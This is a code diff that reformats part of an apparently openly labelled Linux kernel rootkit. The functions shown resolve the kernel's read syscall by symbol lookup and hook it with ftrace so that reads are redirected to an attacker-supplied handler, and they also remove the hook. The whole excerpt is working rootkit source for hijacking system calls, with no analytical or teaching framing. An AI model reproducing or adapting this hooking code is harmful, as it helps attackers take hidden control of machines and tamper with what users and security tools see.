@@ -356,63 +356,38 @@ static int install_hook(void)
  */
 int install_read_hook(kallsyms_lookup_name_t lookup)
 {
-    int
-        ret;
+    int ret;
 
     read_hook.name = "__x64_sys_read";
     read_hook.function = new_read;
     read_hook.original = &orig_read;
 
-    read_hook.address = lookup(
-        read_hook.name);
+    read_hook.address = lookup(read_hook.name);
 
-    if (
-        !read_hook.address)
+    if (!read_hook.address)
     {
-        pr_err(
-            "[-] Symbol not found: __x64_sys_read\n");
+        pr_err("[-] Symbol not found: __x64_sys_read\n");
         return -ENOENT;
     }
-    pr_info(
-        "[+] %s @ 0x%lx\n",
-        read_hook.name,
-        read_hook.address);
+    pr_info("[+] %s @ 0x%lx\n", read_hook.name, read_hook.address);
 
     orig_read = (orig_read_t)read_hook.address;
 
     read_hook.ops.func = hook_callback;
     read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
 
-    ret = ftrace_set_filter_ip(
-        &read_hook.ops,
-        read_hook.address,
-        0,
-        0);
+    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
 
-    if (
-        ret)
-    {
-        pr_err(
-            "[-] ftrace_set_filter_ip (read): %d\n",
-            ret);
+    if (ret) {
+        pr_err("[-] ftrace_set_filter_ip (read): %d\n", ret);
         return ret;
     }
 
-    ret =
-        register_ftrace_function(
-            &read_hook.ops);
+    ret = register_ftrace_function(&read_hook.ops);
 
-    if (
-        ret)
-    {
-        pr_err(
-            "[-] register_ftrace_function (read): %d\n",
-            ret);
-        ftrace_set_filter_ip(
-            &read_hook.ops,
-            read_hook.address,
-            1,
-            0);
+    if (ret) {
+        pr_err("[-] register_ftrace_function (read): %d\n", ret);
+        ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
         return ret;
     }
 
@@ -435,37 +410,18 @@ int install_read_hook(kallsyms_lookup_name_t lookup)
  */
 void uninstall_read_hook(void)
 {
-    if (
-        read_hook.ops.func != NULL)
-    {
-        int
-            ret = unregister_ftrace_function(
-                &read_hook.ops);
+    if (read_hook.ops.func != NULL) {
+        int ret = unregister_ftrace_function(&read_hook.ops);
 
-        if (
-            ret)
-        {
-            printk(
-                KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n",
-                ret);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
         }
     }
 
-    if (
-        read_hook.address != 0)
-    {
-        int
-            ret = ftrace_set_filter_ip(
-                &read_hook.ops,
-                read_hook.address,
-                1,
-                0);
-        if (
-            ret)
-        {
-            printk(
-                KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n",
-                ret);
+    if (read_hook.address != 0) {
+        int ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
         }
     }
 }
